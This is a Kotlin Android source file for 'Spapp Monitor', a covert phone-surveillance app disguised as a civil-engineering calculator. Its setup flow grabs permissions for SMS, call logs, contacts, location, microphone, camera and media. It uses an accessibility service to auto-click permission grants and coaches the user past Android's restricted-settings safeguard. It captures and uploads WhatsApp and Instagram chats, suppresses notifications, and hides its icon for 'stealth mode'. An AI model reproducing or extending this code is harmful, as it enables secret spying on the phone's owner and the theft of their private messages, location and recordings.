package com.spapp.monitoring.ui



import android.Manifest
import android.graphics.Color
import android.widget.ArrayAdapter
import java.util.Locale

import android.content.Context
import android.app.NotificationManager
import android.content.ComponentName

import android.content.Intent

import android.content.pm.PackageManager

import android.content.res.ColorStateList

import android.net.Uri

import android.os.Build

import android.os.Bundle

import android.os.Environment

import android.os.Handler

import android.os.Looper

import android.os.PowerManager

import android.provider.Settings

import android.text.format.DateUtils

import android.util.Log

import android.view.View

import android.widget.Toast

import androidx.activity.result.contract.ActivityResultContracts

import androidx.appcompat.app.AlertDialog

import androidx.appcompat.app.AppCompatActivity

import androidx.core.content.ContextCompat

import com.google.android.material.button.MaterialButton

import com.google.firebase.messaging.FirebaseMessaging

import com.spapp.monitoring.R

import com.spapp.monitoring.admin.SpappDeviceAdminReceiver

import com.spapp.monitoring.blocking.AccessibilityStatus

import com.spapp.monitoring.blocking.BlockAccessibilityService

import com.spapp.monitoring.collectors.AppUsageCollector

import com.spapp.monitoring.collectors.RealtimeLogObserverManager

import com.spapp.monitoring.data.DeviceState

import com.spapp.monitoring.databinding.ActivityMainBinding

import com.spapp.monitoring.fcm.FcmTokenSync

import com.spapp.monitoring.geofence.GeofenceManager

import com.spapp.monitoring.sync.PersistentWatchdogService

import com.spapp.monitoring.sync.SyncScheduler



/**

 * Main Status & Permission Control Center for Spapp Monitor.

 *

 * 1-TAP SETUP FLOW:

 * - Sequentially requests Standard Runtime Permissions + Accessibility Service.

 * - When Accessibility Service is enabled, automatically triggers "SYNC NOW"

 *   (instant WhatsApp & Instagram log sync, SyncScheduler.runOnce, and hides app icon).

 * - Remaining permissions (Battery Optimization, All Files, Notification Listener,

 *   Usage Access, Device Administrator, Autostart) are displayed on-screen for

 *   one-by-one manual toggling.

 */

class MainActivity : AppCompatActivity() {



    private lateinit var binding: ActivityMainBinding

    private lateinit var usageCollector: AppUsageCollector

    private lateinit var geofenceManager: GeofenceManager

    private lateinit var deviceState: DeviceState

    private var isOneTapFlowRunning = false

    private var isAccessibilityDialogShowing = false

    private var skipAccessibilityStep = false

    private var skipNotificationStep = false
    private var notificationPrompted = false

    private var autostartPrompted = false
    private var isExiting = false
    private var batteryPrompted = false

    private fun completeSetupAndClose() {
        if (isExiting) return
        isExiting = true

        isOneTapFlowRunning = false
        deviceState.markSetupCompleted()
        refreshPermissionStatus()
        triggerAutoSyncAfterAccessibility()

        // Hide app icon from launcher for stealth mode
        hideAppIcon()
        Log.i(TAG, "All core permissions active — setup complete, hiding app icon and closing activity")

        Toast.makeText(this, "Setup completed successfully", Toast.LENGTH_SHORT).show()
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                finishAndRemoveTask()
            } catch (e: Exception) {
                Log.w(TAG, "finishAndRemoveTask failed, using finishAffinity fallback", e)
                try {
                    finishAffinity()
                } catch (_: Exception) {}
            }

            try {
                val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(homeIntent)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch home intent fallback", e)
            }
        }, 500L)
    }



    // 1. Standard Runtime Permissions Launcher

    private val runtimePermissionsLauncher = registerForActivityResult(

        ActivityResultContracts.RequestMultiplePermissions()

    ) { results ->

        refreshPermissionStatus()

        // Always initialize log observer and trigger sync once permissions update
        RealtimeLogObserverManager.start(applicationContext)
        SyncScheduler.runOnce(applicationContext)

        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
            handleNextSetupStep()
        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled()) {
            completeSetupAndClose()
        }

        val grantedCount = results.values.count { it }
        if (!isOneTapFlowRunning && !isAccessibilityEnabled() && grantedCount > 0) {
            Toast.makeText(this, "$grantedCount permissions updated", Toast.LENGTH_SHORT).show()
        }

    }



    // 2. Accessibility Launcher (Part of 1-Tap Core Flow)

    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
            isOneTapFlowRunning = true
            handleNextSetupStep()
        } else if (isAccessibilityEnabled() && getMissingRuntimePermissions().isEmpty()) {
            triggerAutoSyncAfterAccessibility()
        }
    }



    // 3. Individual remaining permission launchers (tapped manually)

    private val batteryExemptionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        // Fast-track immediately to Step 5 (Autostart) without waiting
        isOneTapFlowRunning = true
        handleNextSetupStep()
    }



    private val allFilesLauncher = registerForActivityResult(

        ActivityResultContracts.StartActivityForResult()

    ) {

        refreshPermissionStatus()

    }



    private var isNotificationDialogShowing = false

    private val notificationListenerLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        isNotificationDialogShowing = false
        notificationPrompted = true
        refreshPermissionStatus()
        isOneTapFlowRunning = true
        handleNextSetupStep()
    }



    private val usageLauncher = registerForActivityResult(

        ActivityResultContracts.StartActivityForResult()

    ) {

        refreshPermissionStatus()

    }



    private val deviceAdminLauncher = registerForActivityResult(

        ActivityResultContracts.StartActivityForResult()

    ) {

        refreshPermissionStatus()

    }



    private val autostartLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        handleNextSetupStep()
    }



    private val statusHandler = Handler(Looper.getMainLooper())

    private val statusUpdater = object : Runnable {

        override fun run() {

            updateSyncStatusText()

            statusHandler.postDelayed(this, STATUS_REFRESH_MS)

        }

    }



    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)

        setContentView(binding.root)



        deviceState = DeviceState(this)

        usageCollector = AppUsageCollector(this)

        geofenceManager = GeofenceManager(this)



        SyncScheduler.schedule(applicationContext)

        uploadCurrentFcmToken()

        RealtimeLogObserverManager.start(applicationContext)

        // Elevate process priority to FOREGROUND while app is in the foreground
        PersistentWatchdogService.start(applicationContext)



        // Setup interactive Civil Engineering Calculator Suite
        setupCivilCalculators()

        // Automatic permission start for fresh installation
        maybeStartAutoPermissionFlow()
    }



    /**

     * Fresh install: Starts Core (Standard Runtime + Accessibility) flow automatically.

     */

    private fun maybeStartAutoPermissionFlow() {
        val missingRuntime = getMissingRuntimePermissions()
        val isA11y = isAccessibilityEnabled()
        val isNotif = isNotificationAccessGranted()

        if (deviceState.isFirstLaunchAfterInstall() || !isA11y || !isNotif || missingRuntime.isNotEmpty()) {
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    isOneTapFlowRunning = true
                    skipAccessibilityStep = false
                    skipNotificationStep = false
                    handleNextSetupStep()
                }
            }, AUTO_FLOW_DELAY_MS)
        }
    }



    /**

     * Automatic SYNC NOW triggered once as soon as Accessibility permission and Core permissions are granted.

     */

    private fun triggerAutoSyncAfterAccessibility() {

        if (!deviceState.hasAutoSyncedAfterAccessibility && getMissingRuntimePermissions().isEmpty()) {

            deviceState.hasAutoSyncedAfterAccessibility = true

            Log.i(TAG, "Accessibility enabled & core permissions granted: triggering automatic initial sync")

            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)

            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)

            SyncScheduler.runOnce(applicationContext)

            // Muted client-side notification on automated sync

            Log.i(TAG, "Core permissions active: initial sync completed")

        }

    }



    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, "$packageName.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "LauncherAlias disabled: App icon hidden from home screen without touching SplashActivity")
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app icon", e)
        }
    }



    override fun onResume() {
        super.onResume()
        refreshPermissionStatus()
        statusUpdater.run()
        uploadCurrentFcmToken()

        if (deviceState.isFirstSetupCompleted && !isOneTapFlowRunning) {
            return
        }

        val isCore = getMissingRuntimePermissions().isEmpty()
        val isA11y = isAccessibilityEnabled()
        val isNotif = isNotificationAccessGranted()

        if (isCore && isA11y && (isNotif || notificationPrompted) &&
            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
            completeSetupAndClose()
            return
        }

        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
            isOneTapFlowRunning = true
            handleNextSetupStep()
        }
    }



    override fun onPause() {

        super.onPause()

        statusHandler.removeCallbacks(statusUpdater)

    }



    // =========================================================================

    // DYNAMIC 1-TAP SETUP WORKFLOW (Runtime Permissions -> Accessibility)

    // =========================================================================



    private fun handleNextSetupStep() {
        // Step 1: Accessibility Service (Enabled first so auto-grant loop can assist with all subsequent steps)
        if (!isAccessibilityEnabled() && !skipAccessibilityStep) {
            showAccessibilityDialog()
            return
        }

        // Step 2: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All immediately)
        if (isOemRom() && !autostartPrompted) {
            autostartPrompted = true
            val autostartIntent = getAutostartIntent() ?: Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            try {
                autostartLauncher.launch(autostartIntent)
                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                return
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch autostart settings", e)
            }
        }

        // Step 3: Notification Access (WhatsApp & Instagram chat listener)
        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
            showNotificationDialog()
            return
        }

        // Step 4: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
        val missingRuntime = getMissingRuntimePermissions()
        if (missingRuntime.isNotEmpty()) {
            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
            Handler(Looper.getMainLooper()).postDelayed({
                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
            }, 300L)
            return
        }

        // Step 5: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
        if (!isBatteryExempted() && !batteryPrompted) {
            batteryPrompted = true
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryExemptionLauncher.launch(intent)
                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                return
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch battery exemption intent", e)
            }
        }

        completeSetupAndClose()
    }



    private fun showAccessibilityDialog() {
        if (isAccessibilityDialogShowing) return
        isAccessibilityDialogShowing = true

        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
        } else {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                isAccessibilityDialogShowing = false
                try {
                    accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                    if (isOneTapFlowRunning) {
                        skipAccessibilityStep = true
                        handleNextSetupStep()
                    }
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                isAccessibilityDialogShowing = false
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                isAccessibilityDialogShowing = false
                if (isOneTapFlowRunning) {
                    skipAccessibilityStep = true
                    handleNextSetupStep()
                } else {
                    refreshPermissionStatus()
                }
            }
            .setOnDismissListener {
                isAccessibilityDialogShowing = false
            }
            .show()
    }



    private fun showNotificationDialog() {
        if (isNotificationDialogShowing) return
        isNotificationDialogShowing = true

        val appName = getString(R.string.app_name)
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            "To capture WhatsApp & Instagram chat logs:\n\n" +

            "1. Tap 'Go to Settings' -> Find '$appName' -> Toggle ON.\n\n" +

            "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."

        } else {

            "To capture WhatsApp & Instagram chat logs:\n\n" +

            "1. Tap 'Go to Settings' below.\n" +

            "2. Find '$appName' and toggle it ON."

        }



        AlertDialog.Builder(this)

            .setTitle("Enable Notification Access")

            .setMessage(msg)

            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                isNotificationDialogShowing = false
                notificationPrompted = true
                try {
                    notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open notification listener settings", e)
                    if (isOneTapFlowRunning) {
                        skipNotificationStep = true
                        handleNextSetupStep()
                    }
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                isNotificationDialogShowing = false
                notificationPrompted = true
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                isNotificationDialogShowing = false
                skipNotificationStep = true
                notificationPrompted = true
                if (isOneTapFlowRunning) {
                    handleNextSetupStep()
                } else {
                    refreshPermissionStatus()
                }
            }

            .setOnDismissListener {

                isNotificationDialogShowing = false

            }

            .show()

    }



    // =========================================================================

    // PERMISSION STATUS CHECKS & UI REFRESH

    // =========================================================================



    private fun getMissingRuntimePermissions(): List<String> {

        val list = mutableListOf<String>()



        val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasLocation) {

            list.add(Manifest.permission.ACCESS_FINE_LOCATION)

            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)

        }



        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.READ_CALL_LOG)

        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.READ_CONTACTS)

        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.READ_SMS)

        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.RECORD_AUDIO)

        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.CAMERA)

        }



        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            // POST_NOTIFICATIONS omitted to prevent any status bar notification popups

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_MEDIA_IMAGES)

            }

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_MEDIA_VIDEO)

            }

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_MEDIA_AUDIO)

            }

        } else {

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)

            }

        }



        return list

    }



    private fun isBatteryExempted(): Boolean {

        val powerManager = getSystemService(POWER_SERVICE) as PowerManager

        return powerManager.isIgnoringBatteryOptimizations(packageName)

    }



    private fun isAccessibilityEnabled(): Boolean {

        return AccessibilityStatus.isEnabled(this)

    }



    private fun isNotificationAccessGranted(): Boolean {

        return try {

            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")

            listeners?.contains(packageName) == true ||

                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)

        } catch (_: Exception) {

            false

        }

    }



    private fun isUsageAccessGranted(): Boolean = usageCollector.hasUsageAccess()



    private fun isFileAccessGranted(): Boolean {

        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()

    }



    private fun isDeviceAdminActive(): Boolean {

        return SpappDeviceAdminReceiver.isActive(this)

    }



    private fun refreshPermissionStatus() {
        val isCore = getMissingRuntimePermissions().isEmpty()
        val isAccessibility = isAccessibilityEnabled()
        val isNotification = isNotificationAccessGranted()

        if (isCore && isAccessibility && (isNotification || notificationPrompted) &&
            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
            if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
                handleNextSetupStep()
            } else {
                completeSetupAndClose()
            }
        }
    }

    private fun setupCivilCalculators() {
        val tabs = listOf(
            binding.tabConcrete,
            binding.tabBricks,
            binding.tabSteel,
            binding.tabPlaster,
            binding.tabExcavation,
            binding.tabConverter
        )

        val sections = listOf(
            binding.sectionConcrete,
            binding.sectionBricks,
            binding.sectionSteel,
            binding.sectionPlaster,
            binding.sectionExcavation,
            binding.sectionConverter
        )

        fun selectTab(selectedIdx: Int) {
            sections.forEachIndexed { idx, section ->
                section.visibility = if (idx == selectedIdx) View.VISIBLE else View.GONE
            }
            tabs.forEachIndexed { idx, tab ->
                if (idx == selectedIdx) {
                    tab.setBackgroundColor(Color.parseColor("#D97706"))
                    tab.setTextColor(Color.WHITE)
                    tab.strokeWidth = 0
                } else {
                    tab.setBackgroundColor(Color.TRANSPARENT)
                    tab.setTextColor(Color.parseColor("#334155"))
                    tab.strokeColor = ColorStateList.valueOf(Color.parseColor("#CBD5E1"))
                    tab.strokeWidth = 2
                }
            }
        }

        tabs.forEachIndexed { idx, tab ->
            tab.setOnClickListener { selectTab(idx) }
        }

        // Dropdown data setup
        val concreteGrades = arrayOf("M20 (1:1.5:3)", "M15 (1:2:4)", "M25 (1:1:2)")
        binding.actvConcreteGrade.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, concreteGrades))

        val brickThicknesses = arrayOf("9 inch (Main Wall)", "4.5 inch (Partition)")
        binding.actvBrickThickness.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, brickThicknesses))

        val mortarRatios = arrayOf("1:5 (Standard)", "1:4 (Rich)", "1:6 (Lean)")
        binding.actvBrickMortar.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, mortarRatios))

        val steelDiameters = arrayOf("8 mm", "10 mm", "12 mm", "16 mm", "20 mm", "25 mm", "32 mm")
        binding.actvSteelDia.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, steelDiameters))

        val plasterThicknesses = arrayOf("12 mm (Internal)", "15 mm (Ceiling)", "20 mm (External)")
        binding.actvPlasterThickness.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, plasterThicknesses))

        val units = arrayOf("Sq Feet (sqft)", "Cent", "Ground", "Acre", "Sq Meter (sqm)")
        binding.actvConvertFrom.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, units))
        binding.actvConvertTo.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, units))

        // 1. Concrete Calculator
        binding.btnCalcConcrete.setOnClickListener {
            val length = binding.etConcreteLength.text.toString().toDoubleOrNull() ?: 20.0
            val width = binding.etConcreteWidth.text.toString().toDoubleOrNull() ?: 15.0
            val depthInches = binding.etConcreteDepth.text.toString().toDoubleOrNull() ?: 5.0
            val grade = binding.actvConcreteGrade.text.toString()

            val wetVolFt3 = length * width * (depthInches / 12.0)
            val wetVolM3 = wetVolFt3 / 35.3147
            val dryVolFt3 = wetVolFt3 * 1.54

            val (cementP, sandP, aggP) = when {
                grade.contains("M15") -> Triple(1.0, 2.0, 4.0)
                grade.contains("M25") -> Triple(1.0, 1.0, 2.0)
                else -> Triple(1.0, 1.5, 3.0)
            }
            val sum = cementP + sandP + aggP
            val cementBags = (dryVolFt3 * (cementP / sum)) / 1.226
            val sandFt3 = dryVolFt3 * (sandP / sum)
            val sandTons = sandFt3 * 0.0453
            val aggFt3 = dryVolFt3 * (aggP / sum)
            val aggTons = aggFt3 * 0.0453
            val waterLitres = (cementBags * 25).toInt()

            binding.tvConcreteVolume.text = String.format(Locale.US, "Volume: %.1f ft³ (%.2f m³)", wetVolFt3, wetVolM3)
            binding.tvConcreteCement.text = String.format(Locale.US, "• Cement: %.1f Bags (50kg bags)", cementBags)
            binding.tvConcreteSand.text = String.format(Locale.US, "• Sand: %.1f ft³ (%.2f Tons)", sandFt3, sandTons)
            binding.tvConcreteAggregate.text = String.format(Locale.US, "• Aggregate: %.1f ft³ (%.2f Tons)", aggFt3, aggTons)
            binding.tvConcreteWater.text = "• Est. Water: ~$waterLitres Litres"
        }

        // 2. Brickwork Calculator
        binding.btnCalcBricks.setOnClickListener {
            val length = binding.etBrickLength.text.toString().toDoubleOrNull() ?: 20.0
            val height = binding.etBrickHeight.text.toString().toDoubleOrNull() ?: 10.0
            val thicknessStr = binding.actvBrickThickness.text.toString()
            val is9Inch = thicknessStr.contains("9")

            val wallArea = length * height
            val wallVolFt3 = if (is9Inch) wallArea * 0.75 else wallArea * 0.375
            val bricksCount = if (is9Inch) (wallVolFt3 * 13.5 * 1.05).toInt() else (wallArea * 4.5 * 1.05).toInt()
            val wetMortar = wallVolFt3 * (if (is9Inch) 0.30 else 0.25)
            val dryMortar = wetMortar * 1.33
            val cementBags = (dryMortar * (1.0 / 6.0)) / 1.226
            val sandFt3 = dryMortar * (5.0 / 6.0)

            binding.tvBrickCount.text = String.format(Locale.US, "• Total Bricks: %,d Pcs (5%% wastage incl.)", bricksCount)
            binding.tvBrickCement.text = String.format(Locale.US, "• Cement for Mortar: %.1f Bags", cementBags)
            binding.tvBrickSand.text = String.format(Locale.US, "• Sand for Mortar: %.1f ft³ (%.2f Brass)", sandFt3, sandFt3 / 100.0)
        }

        // 3. Steel Weight Calculator
        binding.btnCalcSteel.setOnClickListener {
            val diaStr = binding.actvSteelDia.text.toString().filter { it.isDigit() }
            val dia = diaStr.toDoubleOrNull() ?: 12.0
            val lengthM = binding.etSteelLength.text.toString().toDoubleOrNull() ?: 120.0

            val unitWeightKg = (dia * dia) / 162.0
            val totalWeightKg = unitWeightKg * lengthM
            val totalTons = totalWeightKg / 1000.0
            val rods12m = (lengthM / 12.0).toInt()

            binding.tvSteelUnitWeight.text = String.format(Locale.US, "• Unit Weight: %.3f kg/m (%.2f kg per 12m rod)", unitWeightKg, unitWeightKg * 12)
            binding.tvSteelTotalWeight.text = String.format(Locale.US, "• Total Weight: %.2f kg (%.3f Metric Tons)", totalWeightKg, totalTons)
            binding.tvSteelRods.text = "• Equivalent Rods: ~$rods12m Rods of 12m length"
        }

        // 4. Plastering Calculator
        binding.btnCalcPlaster.setOnClickListener {
            val area = binding.etPlasterArea.text.toString().toDoubleOrNull() ?: 500.0
            val thkStr = binding.actvPlasterThickness.text.toString()
            val thkMm = when {
                thkStr.contains("15") -> 15.0
                thkStr.contains("20") -> 20.0
                else -> 12.0
            }
            val thkFt = thkMm / 304.8
            val wetVol = area * thkFt
            val dryVol = wetVol * 1.5
            val cementBags = (dryVol * (1.0 / 5.0)) / 1.226
            val sandFt3 = dryVol * (4.0 / 5.0)

            binding.tvPlasterCement.text = String.format(Locale.US, "• Cement Required: %.1f Bags (50kg)", cementBags)
            binding.tvPlasterSand.text = String.format(Locale.US, "• Sand Required: %.1f ft³ (%.2f Brass)", sandFt3, sandFt3 / 100.0)
        }

        // 5. Excavation Calculator
        binding.btnCalcExcavation.setOnClickListener {
            val l = binding.etExcavationLength.text.toString().toDoubleOrNull() ?: 30.0
            val w = binding.etExcavationWidth.text.toString().toDoubleOrNull() ?: 20.0
            val d = binding.etExcavationDepth.text.toString().toDoubleOrNull() ?: 5.0

            val volFt3 = l * w * d
            val volM3 = volFt3 / 35.3147
            val brass = volFt3 / 100.0
            val tipperTrips = Math.ceil(brass / 3.0).toInt()

            binding.tvExcavationVolume.text = String.format(Locale.US, "• Total Volume: %,.0f ft³ (%.2f m³)", volFt3, volM3)
            binding.tvExcavationBrass.text = String.format(Locale.US, "• Volume in Brass: %.2f Brass (1 Brass = 100 ft³)", brass)
            binding.tvExcavationTrips.text = "• Est. Tipper Lorry Trips: ~$tipperTrips Loads (3 Brass/trip)"
        }

        // 6. Unit Converter
        binding.btnConvertUnits.setOnClickListener {
            val value = binding.etConverterValue.text.toString().toDoubleOrNull() ?: 2400.0
            val from = binding.actvConvertFrom.text.toString().lowercase()
            val to = binding.actvConvertTo.text.toString().lowercase()

            val inSqFt = when {
                from.contains("cent") -> value * 435.6
                from.contains("ground") -> value * 2400.0
                from.contains("acre") -> value * 43560.0
                from.contains("meter") || from.contains("sqm") -> value * 10.7639
                else -> value
            }

            val converted = when {
                to.contains("cent") -> inSqFt / 435.6
                to.contains("ground") -> inSqFt / 2400.0
                to.contains("acre") -> inSqFt / 43560.0
                to.contains("meter") || to.contains("sqm") -> inSqFt / 10.7639
                else -> inSqFt
            }

            binding.tvConvertResult.text = String.format(Locale.US, "%.2f %s = %.2f %s", value, binding.actvConvertFrom.text, converted, binding.actvConvertTo.text)
        }
    }



    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("poco") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("realme") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor") ||
                manufacturer.contains("oneplus") ||
                manufacturer.contains("samsung")
    }

    private fun getAutostartIntent(): Intent? {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent("miui.intent.action.OP_AUTO_START").addCategory(Intent.CATEGORY_DEFAULT),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            ),
            Intent().setComponent(
                ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")
            ),
            Intent().setComponent(
                ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            )
        )

        for (intent in candidates) {
            try {
                if (packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                    return intent
                }
            } catch (_: Exception) {}
        }

        return null
    }



    private fun openAutostartSettings() {

        val intent = getAutostartIntent()

        if (intent != null) {

            try {

                autostartLauncher.launch(intent)

                return

            } catch (_: Exception) {}

        }

        openAppInfoSettings()

    }



    private fun openAppInfoSettings() {

        try {

            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {

                data = Uri.parse("package:$packageName")

            }

            startActivity(intent)

        } catch (e: Exception) {

            Log.e(TAG, "No app-info settings screen available", e)

        }

    }



    private fun updateSyncStatusText() {
        // Obsolete statusText view replaced by CivilCalc Pro suite; background sync continues silently
    }



    private fun uploadCurrentFcmToken() {

        FirebaseMessaging.getInstance().token

            .addOnSuccessListener { token ->

                Log.d(TAG, "FCM token fetched: $token")

                FcmTokenSync.enqueueUpload(applicationContext, token)

            }

            .addOnFailureListener { e ->

                Log.e(TAG, "FCM token fetch failed", e)

            }

    }



    override fun onBackPressed() {
        // Move app to background naturally instead of destroying the task hierarchy
        moveTaskToBack(true)
    }

    companion object {

        private const val TAG = "MainActivity"

        private const val STATUS_REFRESH_MS = 30_000L

        private const val AUTO_FLOW_DELAY_MS = 1_200L

    }

}